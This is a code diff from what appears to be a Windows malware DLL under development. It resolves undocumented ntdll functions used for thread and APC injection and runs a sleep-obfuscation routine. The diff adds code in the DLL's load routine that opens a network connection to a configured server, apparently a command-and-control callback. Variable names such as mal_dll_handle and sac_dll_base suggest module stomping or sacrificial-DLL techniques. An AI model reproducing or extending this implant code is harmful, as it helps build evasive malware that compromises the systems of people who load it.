@@ -648,76 +648,22 @@ EXTERN_DLL_EXPORT bool _123321_asdf21425()
 }
 
 
-bool init_func_addr(PFUNCTION_ADDRESSES func_addr)
+int connect_to_server(winsock_functions_t* ws_funcs, core_funtions_t* core_funcs)
 {
-	// handle to ntdll and user32
-	HMODULE hm_ntdll = { 0 };
-	HMODULE hm_user32 = { 0 };
-	HMODULE hm_kernel32 = { 0 };
-	if (!(hm_ntdll = GetModuleHandleA("ntdll"))) {
-		return false;
-	}
-	if (!(hm_user32 = GetModuleHandleA("user32.dll"))) {
-		return false;
-	}
-	if (!(hm_kernel32 = GetModuleHandleA("kernel32.dll"))) {
-		return false;
-	}
-	// function pointers for thread contexts
-	func_addr->NtTestAlertAddress = GetProcAddress(hm_ntdll, "NtTestAlert");
-	func_addr->NtWaitForSingleObjectAddress = GetProcAddress(hm_ntdll, "NtWaitForSingleObject");
-	func_addr->MessageBoxAddress = GetProcAddress(hm_user32, "MessageBoxA");
-	func_addr->ResumeThreadAddress = GetProcAddress(hm_kernel32, "ResumeThread");
-
-	if (func_addr->NtTestAlertAddress == NULL
-		|| func_addr->NtWaitForSingleObjectAddress == NULL
-		|| func_addr->MessageBoxAddress == NULL
-		|| func_addr->ResumeThreadAddress == NULL
-		)
+	if (startup_wsa(ws_funcs) != 0)
 	{
-		return false;
+		return -1;
 	}
 
+	if (init_connection(SERVER_HOSTNAME, SERVER_PORT, ws_funcs, core_funcs) != 0)
+	{
+		cleanup_wsa(ws_funcs);
+		return -1;
+	}
 
-	return true;
+	return 0;
 }
 
-
-bool init_nt_func_s(PNT_FUNCTIONS nt_func_s)
-{
-
-	// Load the ntdll.dll library
-	HMODULE hm_ntdll = GetModuleHandleA("ntdll.dll");
-	if (hm_ntdll == NULL)
-	{
-
-		return false;
-	}
-
-	nt_func_s->NtWaitForSingleObject = (NtWaitForSingleObjectFunc)GetProcAddress(hm_ntdll, "NtWaitForSingleObject");//
-	nt_func_s->NtQueueApcThread = (NtQueueApcThreadFunc)GetProcAddress(hm_ntdll, "NtQueueApcThread");//
-	nt_func_s->NtGetContextThread = (NtGetContextThreadFunc)GetProcAddress(hm_ntdll, "NtGetContextThread");//
-	nt_func_s->NtSetContextThread = (NtSetContextThreadFunc)GetProcAddress(hm_ntdll, "NtSetContextThread");//
-	nt_func_s->NtCreateThreadEx = (NtCreateThreadExFunc)GetProcAddress(hm_ntdll, "NtCreateThreadEx"); // Added
-	nt_func_s->NtCreateEvent = (NtCreateEventFunc)GetProcAddress(hm_ntdll, "NtCreateEvent");
-	nt_func_s->NtResumeThread = (NtResumeThreadFunc)GetProcAddress(hm_ntdll, "NtResumeThread");//
-	nt_func_s->NtQuerySystemInformation = (NtQuerySystemInformationFunc)GetProcAddress(hm_ntdll, "NtQuerySystemInformation");
-	nt_func_s->NtQueryObject = (NtQueryObjectFunc)GetProcAddress(hm_ntdll, "NtQueryObject");
-	nt_func_s->NtQueryInformationWorkerFactory = (NtQueryInformationWorkerFactoryFunc)GetProcAddress(hm_ntdll, "NtQueryInformationWorkerFactory");
-
-
-	// Check if all function addresses were retrieved successfully
-	if (!nt_func_s->NtResumeThread || !nt_func_s->NtWaitForSingleObject || !nt_func_s->NtQueueApcThread ||
-		!nt_func_s->NtGetContextThread || !nt_func_s->NtSetContextThread || !nt_func_s->NtCreateThreadEx || !nt_func_s->NtCreateEvent
-		|| !nt_func_s->NtQueryInformationWorkerFactory || !nt_func_s->NtQueryObject || !nt_func_s->NtQuerySystemInformation) // Modified
-	{
-
-		return false;
-	}
-
-	return true;
-
-}
 
 static BOOL custom_process_attach(HMODULE hModule)
 {
@@ -746,31 +692,33 @@ static BOOL custom_process_attach(HMODULE hModule)
 		return FALSE;
 	}
 
-	// initialize all the NtFunctions
-	NT_FUNCTIONS nt_func_s = { 0 };
-	if (!init_nt_func_s(&nt_func_s))
+	// initialize functions 
+	nt_functions_t nt_funcs = { 0 };
+	if (!load_nt_functions(&nt_funcs))
 	{
 		return FALSE;
 	}
 
-	HMODULE hm_ntdll = { 0 };
-	if (!(hm_ntdll = GetModuleHandleA("ntdll.dll")))
-		return FALSE;
-
-	PVOID NtTestAlert_addr = GetProcAddress(hm_ntdll, "NtTestAlert");
-	if (NtTestAlert_addr == NULL)
-		return FALSE;
-
 	winsock_functions_t winsock_funcs = { 0 };
-	BOOL result = load_winsock_functions(&winsock_funcs);
+	if (!load_winsock_functions(&winsock_funcs))
+	{
+		return FALSE;
+	}
 
-	void** buggy = NULL;
-	*buggy = 0;
+	core_funtions_t core_funcs = { 0 };
+	if (!load_core_functions(&core_funcs))
+	{
+		return FALSE;
+	}
+
+	
+	connect_to_server(&winsock_funcs, &core_funcs);
+
 
 	do
 	{
 		MessageBoxA(NULL, "Ciallo～(∠ · ω< )⌒☆", "Ciallo～(∠ · ω< )⌒☆", MB_ICONERROR);
-		if (sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_func_s, NtTestAlert_addr) == -1)
+		if (sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_funcs) == -1)
 		{
 			MessageBoxA(0, 0, 0, MB_OK | MB_ICONINFORMATION);
 			return FALSE;
